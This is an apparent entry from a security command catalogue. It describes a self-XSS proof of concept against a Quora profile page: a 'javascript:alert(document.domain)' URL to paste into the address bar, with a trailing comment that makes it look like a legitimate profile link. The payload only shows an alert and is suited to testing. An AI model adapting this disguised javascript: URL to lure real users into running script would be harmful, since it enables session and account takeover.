---
id: cmd-uuid-456
data: 'javascript:alert(document.domain)// https://www.quora.com/profile/Username/'
tags:
  - xss
  - self-xss
type: command
output: Alert popup displaying 'www.quora.com'
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:16:25.027Z'
verified: false
validated: true
submitted: true
---
# javascript-alert-document-domain

## Command

```javascript
javascript:alert(document.domain)// https://www.quora.com/profile/Username/
```

## Description

This browser-executed command uses the javascript: protocol to run an alert displaying the current document's domain when pasted into the address bar on a Quora profile page, demonstrating self-XSS in the user's session.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| alert(document.domain) | JavaScript code to display the domain in a popup | Yes |
| // https://www.quora.com/profile/Username/ | Comment appending the profile URL to mimic a legitimate link without affecting execution | No |

## Examples

### Basic Usage

```javascript
javascript:alert(document.domain)// https://www.quora.com/profile/Username/
```

Paste into address bar on the profile page to trigger.

### Advanced Usage

```javascript
javascript:alert('Self-XSS Demo')// https://www.quora.com/profile/Username/
```

Customize the alert message for testing.

## Expected Output

An alert dialog box pops up showing the domain 'www.quora.com', executed in the context of the Quora page.

## Related

- [[procedures/Execute-Self-XSS-via-Javascript-URL]]
